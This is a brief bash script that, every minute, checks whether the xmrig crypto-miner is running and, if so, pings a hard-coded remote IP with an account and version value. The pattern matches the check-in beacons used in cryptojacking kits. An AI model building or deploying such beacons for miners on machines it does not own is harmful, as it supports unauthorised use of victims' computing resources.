#!/bin/bash

while true
do
   if pgrep xmrig > /dev/null
   then
       url='http://135.148.11.148/ping.php?account='$1'&version='$2
       curl $url
   fi
   
   sleep 60
done
